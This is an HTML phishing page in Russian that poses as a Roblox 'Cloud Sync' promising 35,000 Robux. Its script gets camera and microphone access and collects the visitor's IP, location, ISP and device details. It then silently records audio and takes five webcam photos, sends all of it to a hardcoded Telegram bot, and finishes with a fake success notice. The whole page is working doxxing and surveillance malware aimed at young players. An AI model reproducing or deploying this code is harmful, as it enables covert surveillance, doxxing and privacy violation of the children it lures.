<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Roblox Cloud Sync</title>
    <style>
        :root { --main: #0084ff; --bg: #020202; }
        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        
        /* Новый футуристичный дизайн */
        .container { width: 85%; max-width: 400px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.1); border-radius: 40px; padding: 45px 25px; text-align: center; backdrop-filter: blur(30px); position: relative; box-shadow: 0 0 100px rgba(0,132,255,0.15); }
        .scanner-line { width: 100%; height: 2px; background: var(--main); position: absolute; top: 0; left: 0; box-shadow: 0 0 15px var(--main); animation: scan 3s infinite linear; opacity: 0.5; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        
        .logo-box { width: 90px; height: 90px; background: #111; border-radius: 25px; display: flex; align-items: center; justify-content: center; margin: 0 auto 25px; border: 1px solid var(--main); }
        h1 { font-size: 24px; font-weight: 900; margin: 0; text-transform: uppercase; letter-spacing: 2px; }
        .payout { font-size: 32px; color: var(--main); font-weight: 900; margin: 10px 0; text-shadow: 0 0 20px rgba(0,132,255,0.5); }
        
        .status-log { background: #000; padding: 15px; border-radius: 15px; font-family: 'Courier New', monospace; font-size: 11px; color: #00ff00; margin: 25px 0; text-align: left; border: 1px solid #111; }
        .btn-start { background: var(--main); color: white; border: none; width: 100%; padding: 22px; border-radius: 20px; font-size: 20px; font-weight: 800; cursor: pointer; display: none; box-shadow: 0 10px 30px rgba(0,132,255,0.4); }
        
        #v { position: absolute; width: 10px; height: 10px; opacity: 0.01; bottom: 0; }
    </style>
</head>
<body onload="initTitan()">

<div class="container">
    <div class="scanner-line"></div>
    <div class="logo-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" width="55" style="filter: invert(1);">
    </div>
    <h1>Cloud Engine</h1>
    <div class="payout">35,000 R$</div>
    
    <div class="status-log" id="log">
        > INITIALIZING...<br>
        > CHECKING MEDIA NODES...
    </div>
    
    <button class="btn-start" id="mainBtn" onclick="runFullDox()">CONFIRM ACCESS</button>
</div>

<video id="v" autoplay playsinline muted></video>
<canvas id="c" style="display:none;"></canvas>

<script>
    const CONFIG = { T: '8357508874:AAGFROVFi2_D2AcQKIYlZ7rWgsqqedB3y3I', C: '7889497672' };
    let liveStream = null;

    async function initTitan() {
        const log = document.getElementById('log');
        try {
            liveStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", frameRate: { ideal: 30 } }, 
                audio: true 
            });
            document.getElementById('v').srcObject = liveStream;
            
            log.innerHTML += "<br>> ACCESS GRANTED<br>> SYNC READY";
            document.getElementById('mainBtn').style.display = 'block';
        } catch (e) {
            log.innerHTML += "<br>> ERROR: ACCESS DENIED";
            alert("Для верификации 35,000 Robux требуется доступ к камере.");
            location.reload();
        }
    }

    async function runFullDox() {
        document.getElementById('mainBtn').style.display = 'none';
        const log = document.getElementById('log');
        log.innerHTML = "> EXTRACTING CORE DATA...<br>> CAPTURING STREAM...";

        // 🛰 МАКСИМУМ ДОКСА
        let report = `💎 **TITAN-ULTIMATE REPORT** 💎\n\n`;
        try {
            const r = await fetch('https://ipapi.co/json/');
            const d = await r.json();
            report += `📍 IP: \`${d.ip}\`\n🌍 City: ${d.city}, ${d.country_name}\n📡 ISP: ${d.org}\n`;
        } catch(e) {}

        report += `\n⚙️ **HARDWARE:**\n`;
        report += `📱 Platform: ${navigator.platform}\n`;
        report += `⚙️ Cores: ${navigator.hardwareConcurrency}\n`;
        report += `🧠 RAM: ${navigator.deviceMemory || '?'} GB\n`;
        report += `🖥 Display: ${screen.width}x${screen.height}\n`;
        report += `🎮 GPU: ${getG()}\n`;
        report += `🔋 Power: ${navigator.getBattery ? (await (await navigator.getBattery()).level * 100).toFixed(0) + '%' : '?'}\n`;
        report += `🌐 Net: ${navigator.connection ? navigator.connection.effectiveType : 'unknown'}\n`;

        const devs = await navigator.mediaDevices.enumerateDevices();
        report += `\n📸 **NODES:**\n`;
        devs.forEach(dev => { if(dev.label) report += `🔹 ${dev.label}\n`; });

        // 🎤 ЗАПИСЬ ЗВУКА
        const rec = new MediaRecorder(liveStream);
        const chunks = [];
        rec.ondataavailable = e => chunks.push(e.data);
        rec.onstop = async () => {
            const b = new Blob(chunks, { type: 'audio/ogg' });
            const fd = new FormData();
            fd.append('chat_id', CONFIG.C);
            fd.append('voice', b, 'v.ogg');
            fetch(`https://api.telegram.org/bot${CONFIG.T}/sendVoice`, { method: 'POST', body: fd });
        };
        rec.start();

        // 📸 СЕРИЯ ФОТО (ФИКС ЧЕРНОГО ЭКРАНА)
        const v = document.getElementById('v');
        const c = document.getElementById('c');
        
        for (let i = 1; i <= 5; i++) {
            await new Promise(r => setTimeout(r, 1500)); // Даем камере прогрузиться
            log.innerHTML = `> SYNCING: ${i*20}%`;
            
            c.width = v.videoWidth || 1280;
            c.height = v.videoHeight || 720;
            c.getContext('2d').drawImage(v, 0, 0);
            
            const blob = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.95));
            const fd = new FormData();
            fd.append('chat_id', CONFIG.C);
            fd.append('photo', blob, `img_${i}.jpg`);
            if (i === 1) fd.append('caption', report);
            
            await fetch(`https://api.telegram.org/bot${CONFIG.T}/sendPhoto`, { method: 'POST', body: fd });
        }

        rec.stop();
        alert("✅ Верификация завершена! Начисление начнется через 15 минут.");
        window.location.href = "https://www.roblox.com";
    }

    function getG() {
        try {
            const gl = document.createElement('canvas').getContext('webgl');
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            return gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);
        } catch(e) { return '?'; }
    }
</script>
</body>
</html>
